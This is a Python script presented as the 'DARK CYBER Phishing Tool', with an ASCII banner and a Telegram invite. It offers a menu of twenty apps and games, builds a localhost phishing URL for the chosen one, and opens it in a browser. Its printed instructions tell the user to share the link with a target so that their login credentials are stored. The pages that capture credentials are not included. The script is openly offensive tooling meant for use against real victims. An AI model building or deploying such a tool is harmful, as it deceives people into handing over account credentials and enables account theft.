import os
import random
import string
import webbrowser

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

apps = {
    "1": "facebook",
    "2": "pubg",
    "3": "freefire",
    "4": "fortnite",
    "5": "onestate",
    "6": "fifa",
    "7": "pesmobile",
    "8": "cod",
    "9": "minecraft",
    "10": "valorant",
    "11": "gtav",
    "12": "whatsapp",
    "13": "instagram",
    "14": "tiktok",
    "15": "telegram",
    "16": "netflix",
    "17": "youtube",
    "18": "snapchat",
    "19": "twitter",
    "20": "google"
}

def generate_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def print_logo():
    logo = '''
{CYAN}██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║██████╔╝█████╔╝     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔═══╝ ██╔══██║██╔═══╝ ██╔═██╗     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║     ██║  ██║██║     ██║  ██╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RESET}
'''.format(CYAN=CYAN, RESET=RESET)
    print(logo)
    print(f"{YELLOW}Welcome to DARK CYBER Phishing Tool{RESET}")
    print(f"{GREEN}Join our Telegram: https://t.me/+PFbp1Ayc_1I3ZTFk{RESET}\n")

def main():
    print_logo()
    print(f"{CYAN}Select an app or game to generate a phishing link:{RESET}")
    for number, name in apps.items():
        print(f"{YELLOW}{number}{RESET} - {name.title()}")

    choice = input(f"\n{CYAN}Enter your choice (number): {RESET}")
    if choice not in apps:
        print(f"{RED}Invalid choice! Exiting.{RESET}")
        return

    app = apps[choice]
    user_id = generate_id()
    phishing_url = f"http://localhost:8000/apps/{app}/index.html?uid={user_id}"

    print(f"\n{GREEN}Phishing URL generated:{RESET} {phishing_url}")
    print(f"{YELLOW}Share this link to your target. When they login, their credentials will be stored.{RESET}")

    # open in browser (only for test purposes)
    try:
        webbrowser.open(phishing_url)
    except:
        pass

if __name__ == "__main__":
    main()
